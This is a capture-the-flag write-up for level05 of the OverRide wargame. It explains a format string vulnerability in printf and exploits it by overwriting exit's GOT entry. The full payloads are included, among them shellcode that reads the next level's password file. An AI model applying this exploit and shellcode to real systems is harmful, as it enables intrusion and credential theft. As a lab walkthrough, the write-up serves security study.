This time the binary ask nothing but wait for an input inside STDIN.

	level05@OverRide:~$ ./level05 
	test 
	test

Nothing happened there so lets try with another input.

	level05@OverRide:~$ ./level05 
	TEST
	test

Okay something changed my input in lowercase, let's analyse the code.

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  char s[100];
  unsigned int i;

  i = 0;
  fgets(s, 100, stdin);
  for ( i = 0; i < strlen(s); ++i )
  {
    if ( s[i] > 64 && s[i] <= 90 )	// This condition is most likely 
      s[i] ^= 0x20u; 				// the tolower() function.
  }
  printf(s);	// String attack possible here
  exit(0);		// Some function that we're gonna rewrite for sure !
}
```

To be clear, the tolower function is just a bait there and we'll do nothing with it.\
Lets check the two line that we're gonna use to clear the level.

+ printf(s);
This printf is vulnerable to format string attack (we saw it in the previous level)

+ exit(0);
With the string attack we're going to rewrite this function.

So let's start with the shell code (since there is no usable function inside the code).

	level05@OverRide:~$ export SHELLCODE=`python -c 'print "\x90" * 242 + "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level06/.pass"'`

It's the same shellcode as in level01, we're going to cat the .pass file.

Since it's the same way than in level01 I will not write how to get the shellcode address.

Shellcode: **0xffffd85a**

Now we have to find the address which exit points.\
We're going to use objdump.

	level05@OverRide:~$ objdump -R level05 | grep exit
	080497e0 R_386_JUMP_SLOT   exit

Exit: **080497e0**

Now it's time to write our payload.

	python -c 'print "\xe0\x97\x04\x08\xe2\x97\x04\x08" + "%55378x%10$n%10149x%11$n"' | ./level05

I'll explain some more why the payload looks this unfamiliar.

	level05@OverRide:~$ ./level05 
	BBBBAAAA %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
	bbbbaaaa 64 f7fcfac0 f7ec3add ffffd58f ffffd58e 0 ffffffff ffffd614 f7fdb000 62626262 61616161 20782520 25207825 78252078 20782520 25207825

There we can see that we can rewrite in more than one address since it's kind of a big number where our shellcode is stored we're going to cut it in two part.\
**ffff** and **d85a**\
Since we rewrite two time we need two address **080497e0** and the one just after **080497e2**\
Finally after the conversion it will be **55378** and **10149** that we will rewrite at the 10 and 11 address in the stack.

And that's it, let's get to the level06 !